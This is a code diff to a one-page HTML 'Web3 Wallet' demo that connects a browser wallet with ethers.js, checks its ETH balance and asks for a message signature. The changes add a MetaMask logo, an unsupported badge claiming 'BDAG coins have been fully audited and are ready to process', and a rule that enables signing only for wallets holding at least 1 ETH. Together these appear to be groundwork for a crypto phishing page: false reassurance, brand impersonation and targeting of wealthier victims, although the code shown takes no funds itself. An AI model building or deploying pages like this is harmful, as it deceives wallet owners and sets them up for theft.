@@ -1,137 +1,197 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Web3 Wallet </title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Web3 Wallet</title>
+
+<!-- Google Fonts for a modern font -->
+<link href="https://fonts.googleapis.com/css2?family=Inter&display=swap" rel="stylesheet">
 
 <style>
-body{
-    font-family:Arial,Helvetica,sans-serif;
-    max-width:700px;
-    margin:40px auto;
-    padding:20px;
-    background:#f4f4f4;
+body {
+    font-family: 'Inter', Arial, Helvetica, sans-serif;
+    background: #f0f2f5;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    margin: 0;
 }
 
-.card{
-    background:white;
-    border-radius:10px;
-    padding:25px;
-    box-shadow:0 2px 8px rgba(0,0,0,.1);
+.container {
+    background: #fff;
+    border-radius: 12px;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+    max-width: 400px;
+    width: 100%;
+    padding: 30px;
+    box-sizing: border-box;
+    text-align: center;
+    position: relative;
 }
 
-button{
-    padding:12px 18px;
-    margin:10px 0;
-    cursor:pointer;
+/* Logo style */
+.logo {
+  width: 80px;
+  margin-bottom: 10px;
 }
 
-pre{
-    white-space:pre-wrap;
-    word-break:break-word;
-    background:#eee;
-    padding:12px;
+/* Audit badge style */
+.audit-badge {
+  display: inline-block;
+  background-color: #4CAF50;
+  color: #fff;
+  padding: 8px 14px;
+  border-radius: 20px;
+  font-size: 14px;
+  font-weight: 600;
+  margin-bottom: 20px;
+  letter-spacing: 0.5px;
+}
+
+/* Header styles */
+h2 {
+  margin-top: 0;
+  font-weight: 700;
+  color: #333;
+}
+
+/* Paragraph styles */
+p {
+  font-size: 15px;
+  color: #555;
+  margin-bottom: 20px;
+}
+
+/* Buttons styling */
+button {
+  width: 100%;
+  padding: 14px;
+  margin: 10px 0;
+  border: none;
+  border-radius: 8px;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: background 0.3s, transform 0.2s;
+}
+
+button:disabled {
+  background: #ccc;
+  cursor: not-allowed;
+}
+
+button:hover:not(:disabled) {
+  background: #4CAF50;
+  transform: translateY(-2px);
+}
+
+/* Result display styling */
+#result {
+  margin-top: 20px;
+  background: #f9f9f9;
+  border-radius: 8px;
+  padding: 15px;
+  font-family: monospace;
+  font-size: 14px;
+  white-space: pre-wrap;
+  color: #333;
+  min-height: 80px;
+  text-align: left;
 }
 </style>
 </head>
-
 <body>
 
-<div class="card">
+<div class="container">
+  <!-- Logo -->
+  <img src="https://cdn.iconscout.com/icon/free/png-256/metamask-2752174-2284965.png" class="logo" alt="Logo" />
 
-<h2>Web3 Wallet </h2>
+  <!-- Audit Badge -->
+  <div class="audit-badge">BDAG coins have been fully audited and are ready to process</div>
 
-<p>
-This page demonstrates how to connect a wallet, read its address and ETH balance,
-and request a message signature.
-</p>
-
-<button id="connectButton">Connect Wallet</button>
-
-<button id="signButton" disabled>
-Sign Message
-</button>
-
-<pre id="result"></pre>
-
+  <h2>Web3 Wallet</h2>
+  <p>This page demonstrates how to connect a wallet, read its address and ETH balance, and request a message signature.</p>
+  <button id="connectButton">Connect Wallet</button>
+  <button id="signButton" disabled>Sign Message</button>
+  <pre id="result"></pre>
 </div>
 
+<!-- Include ethers.js library -->
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-
 <script>
-
 let provider;
 let signer;
+let currentAddress;
 
-const result=document.getElementById("result");
+const result = document.getElementById("result");
+const connectBtn = document.getElementById("connectButton");
+const signBtn = document.getElementById("signButton");
 
-document.getElementById("connectButton").onclick=async()=>{
-
-    if(!window.ethereum){
+connectBtn.onclick = async () => {
+    if (!window.ethereum) {
         alert("No compatible wallet detected.");
         return;
     }
-
-    try{
-
-        provider=new ethers.providers.Web3Provider(window.ethereum);
-
-        await provider.send("eth_requestAccounts",[]);
-
-        signer=provider.getSigner();
-
-        const address=await signer.getAddress();
-const balance = await provider.getBalance(address);
-
-const eth = ethers.utils.formatEther(balance);
-
-const balanceInEth = Number(eth);
-
-if (balanceInEth >= 1) {
-    result.textContent =
+    try {
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
+        currentAddress = await signer.getAddress();
+        const balance = await provider.getBalance(currentAddress);
+        const ethBalance = ethers.utils.formatEther(balance);
+        const balanceInEth = Number(ethBalance);
+        if (balanceInEth >= 1) {
+            result.textContent =
 `Wallet Connected
 
 Address:
-${address}
+${currentAddress}
 
 Balance:
 ${balanceInEth.toFixed(4)} ETH
 
 Status:
 Eligible (Balance requirement met)`;
-} else {
-    result.textContent =
+            signBtn.disabled = false;
+        } else {
+            result.textContent =
 `Wallet Connected
 
 Address:
-${address}
+${currentAddress}
 
 Balance:
 ${balanceInEth.toFixed(4)} ETH
 
 Status:
 Not Eligible (Minimum 1 ETH required)`;
-}
-
-        document.getElementById("signButton").disabled=false;
-
+            signBtn.disabled = true;
+        }
+    } catch (e) {
+        alert("Failed to connect wallet or retrieve balance.");
+        console.error(e);
     }
-
-    catch(e){
-
-        result.textContent="Connection cancelled.";
-
-    }
-
 };
 
-document.getElementById("signButton").onclick=async()=>{
+signBtn.onclick = async () => {
+    if (!signer || signBtn.disabled) return;
 
-    try{
+    // Check balance again before signing
+    const balance = await provider.getBalance(currentAddress);
+    const ethBalance = ethers.utils.formatEther(balance);
+    const balanceInEth = Number(ethBalance);
 
-        const message=
-` Message
+    if (balanceInEth < 1) {
+        alert("Signature failed, need balance of 1 ETH");
+        signBtn.disabled = true;
+        return;
+    }
+
+    try {
+        const message = `
+Message
 
 This is a demonstration signature.
 
@@ -141,22 +201,15 @@ Signing this message:
 • does NOT consume gas
 
 Time:
-${new Date().toISOString()}`;
-
-        const signature=await signer.signMessage(message);
-
-        result.textContent+=`\n\nSignature:\n${signature}`;
-
+${new Date().toISOString()}
+        `;
+        const signature = await signer.signMessage(message);
+        result.innerHTML = `<b>Signature:</b> ${signature}`;
+    } catch (e) {
+        alert("Signature request cancelled or failed.");
+        console.error(e);
     }
-
-    catch(e){
-
-        result.textContent+="\n\nSignature request cancelled.";
-
-    }
-
 };
-
 </script>
 
 </body>
